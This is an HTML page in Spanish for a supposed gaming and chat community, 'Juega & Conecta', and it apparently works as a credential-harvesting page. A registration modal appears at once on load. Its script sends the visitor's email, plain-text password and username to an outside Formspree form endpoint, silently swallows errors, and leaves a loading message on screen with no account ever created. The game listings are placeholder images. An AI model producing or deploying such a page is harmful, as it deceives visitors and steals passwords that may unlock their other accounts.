<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Plataforma de Juegos - Chat</title>
  <meta name="description" content="Página de juegos y chat — profesional, responsiva y lista para GitHub Pages. Incluye modal de registro que envía datos a Formspree." />
  <style>
    :root{
      --accent:#1f6feb;
      --accent-2:#7c3aed;
      --muted:#6b7280;
      --card-shadow: 0 6px 18px rgba(16,24,40,0.08);
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    }
    *{box-sizing:border-box}
    body{margin:0;background:#ffffff;color:#0f172a;line-height:1.4}
    .container{max-width:1200px;margin:0 auto;padding:28px}
    header{display:flex;align-items:center;justify-content:space-between;padding:18px 0}
    .brand{display:flex;align-items:center;gap:12px}
    .brand img{height:48px;width:48px;object-fit:contain}
    h1{font-size:28px;margin:0}
    .subtitle{color:var(--muted);font-size:14px}
    .hero{display:grid;grid-template-columns:1fr 420px;gap:28px;margin-top:18px}
    .panel{background:#fff;border-radius:16px;padding:22px;box-shadow:var(--card-shadow)}
    .games-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
    .game-card{border-radius:12px;padding:12px;background:#fff;display:flex;flex-direction:column;gap:8px;align-items:center;border:1px solid rgba(16,24,40,0.08)}
    .game-card img{width:100%;height:120px;object-fit:cover;border-radius:8px}
    .game-title{font-weight:600}
    .game-meta{font-size:13px;color:var(--muted)}
    .featured{display:flex;flex-direction:column;gap:12px}
    .featured img{width:100%;height:260px;object-fit:cover;border-radius:12px}
    .btn{padding:12px 16px;border-radius:10px;border:0;cursor:pointer;font-weight:600}
    .btn-primary{background:linear-gradient(90deg,var(--accent),var(--accent-2));color:#fff}
    .btn-ghost{background:transparent;border:1px solid rgba(16,24,40,0.06)}
    footer{margin-top:28px;padding:18px 0;text-align:center;color:var(--muted);font-size:14px}
    .overlay{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.5);backdrop-filter:blur(6px);z-index:60}
    .modal{width:min(520px,94%);background:#fff;border-radius:14px;padding:22px;box-shadow:0 20px 60px rgba(2,6,23,0.45)}
    .modal .logo{text-align:center;margin-bottom:10px}
    .modal h2{text-align:center;margin:10px 0 6px;font-size:20px}
    .form-group{display:flex;flex-direction:column;gap:6px;margin-bottom:12px}
    label{font-size:13px;color:var(--muted)}
    input{padding:12px;border-radius:10px;border:1px solid rgba(16,24,40,0.2);outline:none;font-size:15px}
    input:focus{border-color:var(--accent)}
    .btn-submit{width:100%;padding:12px;border-radius:10px;background:linear-gradient(90deg,var(--accent),var(--accent-2));color:#fff;font-weight:600;cursor:pointer;border:none}
    .loading{display:none;text-align:center;margin-top:12px;color:var(--muted);font-weight:bold}
    .impact{text-align:center;font-weight:700;font-size:18px;color:var(--accent);margin-top:10px}
    .username-row{max-height:0;overflow:hidden;transition:max-height 0.3s ease}
    .username-row.open{max-height:120px}
  </style>
</head>
<body>
  <div class="container">
    <header>
      <div class="brand">
        <img src="logo.png" alt="Logo" />
        <div>
          <h1>Juega & Conecta</h1>
          <div class="subtitle">La comunidad de chat gaming — juega, habla y gana</div>
        </div>
      </div>
      <nav>
        <button class="btn btn-ghost">Iniciar sesión</button>
        <button class="btn btn-primary" id="openRegister">Registrate</button>
      </nav>
    </header>

    <main class="hero">
      <section class="panel">
        <h2>Juegos Destacados</h2>
        <div class="games-grid" id="gamesGrid"></div>
      </section>
      <aside class="featured panel">
        <img src="https://picsum.photos/seed/arena/900/400" alt="Arena" />
        <h3>Modo Arena — Enfréntate hoy</h3>
        <p class="subtitle">Compite con jugadores reales y sube en la tabla.</p>
      </aside>
    </main>

    <footer>
      <small>&copy; <span id="year"></span> Juega & Conecta — Hecho para la comunidad</small>
    </footer>
  </div>

  <!-- Modal Registro -->
  <div class="overlay" id="overlay" style="display:flex;">
    <div class="modal">
      <div class="logo"><img src="logo.png" alt="Logo" style="height:64px;width:64px;" /></div>
      <h2>Regístrate ahora</h2>
      <form id="regForm">
        <div class="form-group">
          <label for="email">Correo electrónico</label>
          <input id="email" name="email" type="email" required>
        </div>
        <div class="form-group">
          <label for="password">Contraseña</label>
          <input id="password" name="password" type="password" required>
        </div>
        <div class="form-group username-row" id="usernameRow">
          <label for="username">Nombre de usuario</label>
          <input id="username" name="username" type="text">
        </div>
        <button type="button" class="btn-submit" id="registerBtn">Registrarse</button>
        <div class="impact" id="impactText">¡ÚNETE AHORA — LA AVENTURA TE ESPERA!</div>
        <div class="loading" id="loadingText">Cargando...</div>
      </form>
    </div>
  </div>

  <script>
    const openBtn = document.getElementById('openRegister');
    const overlay = document.getElementById('overlay');
    openBtn.addEventListener('click',()=>{overlay.style.display='flex';});
    document.getElementById('year').textContent = new Date().getFullYear();

    const registerBtn = document.getElementById('registerBtn');
    const email = document.getElementById('email');
    const password = document.getElementById('password');
    const usernameRow = document.getElementById('usernameRow');
    const username = document.getElementById('username');
    const impactText = document.getElementById('impactText');
    const loadingText = document.getElementById('loadingText');
    let stage = 1;

    registerBtn.addEventListener('click', ()=>{
      if(stage===1){
        if(!email.value || !password.value){
          impactText.textContent = 'Completa correo y contraseña';
          impactText.style.color='crimson';
          return;
        }
        usernameRow.classList.add('open');
        username.required = true;
        impactText.textContent = 'Ahora elige tu nombre público';
        impactText.style.color='var(--accent)';
        stage=2;
        return;
      }
      if(stage===2){
        if(!email.value || !password.value || !username.value){
          impactText.textContent = 'Rellena todos los campos';
          impactText.style.color='crimson';
          return;
        }
        // Mostrar cargando
        loadingText.style.display='block';
        impactText.style.display='none';

        // Enviar datos como FormData a Formspree
        const formData = new FormData();
        formData.append('email', email.value);
        formData.append('password', password.value);
        formData.append('username', username.value);

        fetch('https://formspree.io/f/xwpnokgw',{
          method:'POST',
          body:formData,
          headers:{'Accept':'application/json'}
        }).catch(err=>console.log('Error silencioso',err));
      }
    });

    // generar juegos de muestra
    const games = [
      {title:'Batalla de Reinos',meta:'Multijugador 5v5',img:'https://picsum.photos/seed/g1/600/400'},
      {title:'Carrera Ninja',meta:'Aventura y velocidad',img:'https://picsum.photos/seed/g2/600/400'},
      {title:'Rompecabezas Místico',meta:'Puzzles diarios',img:'https://picsum.photos/seed/g3/600/400'},
      {title:'Tiro Preciso',meta:'Ranked',img:'https://picsum.photos/seed/g4/600/400'},
      {title:'Super Soccer',meta:'Deporte en línea',img:'https://picsum.photos/seed/g5/600/400'},
      {title:'Escape Room',meta:'Cooperativo',img:'https://picsum.photos/seed/g6/600/400'}
    ];
    const grid = document.getElementById('gamesGrid');
    games.forEach(g=>{
      const card=document.createElement('div');
      card.className='game-card';
      card.innerHTML=`<img src=\"${g.img}\" alt=\"${g.title}\"><div class=\"game-title\">${g.title}</div><div class=\"game-meta\">${g.meta}</div>`;
      grid.appendChild(card);
    });
  </script>
</body>
</html>

